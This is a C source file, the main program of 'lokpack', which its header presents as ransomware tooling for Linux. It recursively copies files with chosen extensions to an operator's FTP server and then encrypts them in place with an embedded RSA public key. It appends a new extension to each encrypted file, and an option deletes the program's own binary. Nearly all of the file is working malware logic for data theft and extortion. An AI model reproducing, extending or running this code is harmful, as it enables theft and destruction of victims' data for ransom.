// clang-format off

/*

 * lokpack | Ransomware tooling for x84_64 Linux
 * Written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

#include <curl/curl.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/pool.h"
#include "../lib/rsa.h"
#include "../lib/util.h"
#include "op.h"
#include "workers.h"

typedef struct ctx {
  threadpool pool;
  clist_t   *valid_exts;
  clist_t   *target_paths;
  char      *ftp_user;
  char      *ftp_pwd;
  char      *ftp_url;
  char       ext[8];
} ctx_t;

void upload_files(char *path, ctx_t *ctx) {
  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK) < 0)
      continue;

    struct stat st;
    if (stat(fp, &st) < 0)
      continue;

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Uploading directory: %s...", fp);
      upload_files(strdup(fp), ctx);
      continue;
    }

    if (!has_valid_exts(fp, ctx->valid_exts))
      continue;

    upload_args_t *args = malloc(sizeof(upload_args_t));

    args->file = strdup(fp);
    args->url  = ctx->ftp_url;
    args->user = ctx->ftp_user;
    args->pwd  = ctx->ftp_pwd;

    debug("Uploading file: %s...", fp);
    thpool_add_work(ctx->pool, upload_file, args);
  }

  free(path);
  closedir(dir);
  return;
}

void encrypt_files(char *path, ctx_t *ctx) {
  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK & W_OK) < 0) {
      debug("Skipping because access check failed: %s", fp);
      continue;
    }

    struct stat st;
    if (stat(fp, &st) < 0) {
      debug("Skipping because stat failed: %s", fp);
      continue;
    }

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Encrypting directory: %s...", fp);
      encrypt_files(strdup(fp), ctx);
      continue;
    }

    if (st.st_size <= 0)
      continue;

    if (endswith(fp, ctx->ext))
      continue;

    if (!has_valid_exts(fp, ctx->valid_exts))
      continue;

    encrypt_args_t *args = malloc(sizeof(encrypt_args_t));

    args->st = malloc(sizeof(struct stat));
    memcpy(args->st, &st, sizeof(struct stat));

    args->file = strdup(fp);
    args->ext  = ctx->ext;

    debug("Encrypting file: %s...", fp);
    thpool_add_work(ctx->pool, encrypt_file, args);
  }

  free(path);
  closedir(dir);
  return;
}

bool handle_upload(ctx_t *ctx, char **argv) {
  if (eq(get_str("ftp-url"), "ftp://example")) {
    error("Please specify a valid URL for FTP(S) connection, or disable it "
          "with --no-ftp");
    return false;
  }

  ctx->ftp_user = get_str("ftp-user");
  ctx->ftp_pwd  = get_str("ftp-pwd");
  ctx->ftp_url  = get_str("ftp-url");

  if (get_bool("destruct"))
    unlink(argv[0]);

  for (int i = 0; i < ctx->target_paths->s; i++) {
    char *cur = ctx->target_paths->c[i];
    if (access(cur, R_OK) < 0) {
      error("Failed to access the path: %s", cur);
      continue;
    }
    info("Uploading %s...", cur);
    upload_files(strdup(cur), ctx);
    thpool_wait(ctx->pool);
  }

  return true;
}

bool handle_encrypt(ctx_t *ctx, char **argv) {
  if (get_bool("destruct"))
    unlink(argv[0]);

  if (!rsa_init(BUILD_PUB, true)) {
    error("Failed to init RSA key");
    return false;
  }

  for (int i = 0; i < ctx->target_paths->s; i++) {
    char *cur = ctx->target_paths->c[i];
    if (access(cur, R_OK & W_OK) < 0) {
      error("Failed to access the path: %s", cur);
      continue;
    }
    info("Encrypting %s...", cur);
    encrypt_files(strdup(cur), ctx);
    thpool_wait(ctx->pool);
  }

  return true;
}

int main(int argc, char **argv) {
  int ret = EXIT_FAILURE;

  for (int i = 1; i < argc; i++) {
    if (!parse_opt(argv[i]))
      return EXIT_FAILURE;
  }

  info("Running version "FG_BOLD VERSION FG_RESET" with following options:");
  print_opts();

  if (eq(get_str("paths"), "/example")) {
    error("Please specify valid directories/directory");
    return ret;
  }

  ctx_t ctx = {
      .pool         = NULL,
      .target_paths = NULL,
      .valid_exts   = NULL,
      .ftp_url      = NULL,
      .ftp_user     = NULL,
      .ftp_pwd      = NULL,
  };

  ctx.target_paths = clist_from_str(get_str("paths"));
  ctx.valid_exts   = clist_from_str(get_str("exts"));
  ctx.pool         = thpool_init(get_int("threads"));

  if (ctx.target_paths->s <= 0) {
    error("Please specify at least one directory");
    goto DONE;
  }

  char *sum = get_md5(BUILD_PUB);
  snprintf(ctx.ext, 8, "%.5s", sum);

  if (!get_bool("no-ftp") && !handle_upload(&ctx, argv))
    goto DONE;

  handle_encrypt(&ctx, argv);
  success("Completed, cleaning up");

DONE:
  clist_free(ctx.valid_exts);
  clist_free(ctx.target_paths);

  thpool_destroy(ctx.pool);

  rsa_free();
  return ret;
}
